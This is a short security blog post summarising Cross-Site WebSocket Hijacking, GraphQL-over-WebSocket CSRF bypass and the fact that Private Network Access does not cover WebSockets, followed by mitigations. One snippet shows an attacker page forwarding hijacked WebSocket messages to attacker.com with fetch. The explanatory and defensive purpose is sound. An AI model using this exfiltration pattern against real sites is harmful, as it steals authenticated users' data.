---
title: "Cross-Site WebSocket Hijacking (CSWSH) in 2025"
date: 2025-04-01
categories:
  - Security Research
  - WebSocket
  - CSRF
---

## Overview

Leveraging CSWSH via WebSocket-accessible GraphQL to bypass preflight-gated CSRF protections, plus showing that Private Network Access doesn't apply to WebSockets.

## Introduction

Cross-Site WebSocket Hijacking (CSWSH) allows attackers to hijack legitimate WebSocket connections. New research shows it's still effective in modern applications.

## The Vulnerability

### Traditional CSWSH

```
// Attacker controls this page
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = msg => {
    fetch('https://attacker.com/steal?data=' + msg.data);
};
```

### GraphQL Exploitation

GraphQL endpoints accessible via WebSocket can bypass traditional CSRF protections:

1. **Preflight Bypass**: GraphQL over WebSocket doesn't require CORS preflight
2. **Authentication Cookie**: Cookies are sent automatically with WebSocket handshake

## Private Network Access (PNA) Limitation

PNA restricts access to private network resources from public contexts. However:

> Private Network Access doesn't apply to WebSockets

This means cross-origin WebSockets can still reach private-IP services!

## Attack Scenarios

### 1. Internal Service Access

```
// Connect to internal service via WebSocket
const ws = new WebSocket('ws://192.168.1.100:8080/api');
```

### 2. API Token Theft

```
// Hijack authenticated WebSocket session
ws.send(JSON.stringify({query: mutation {...}}));
```

### 3. Real-time Data Exfiltration

Monitor and exfiltrate sensitive real-time data streams.

## Mitigation

1. **Origin Validation**: Verify Origin header in WebSocket handshake
2. **Token-based Auth**: Use tokens, not just cookies
3. **CSRF Tokens**: Apply to WebSocket connections
4. **PNA Headers**: Implement appropriate security headers

## References

- [Original Research](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
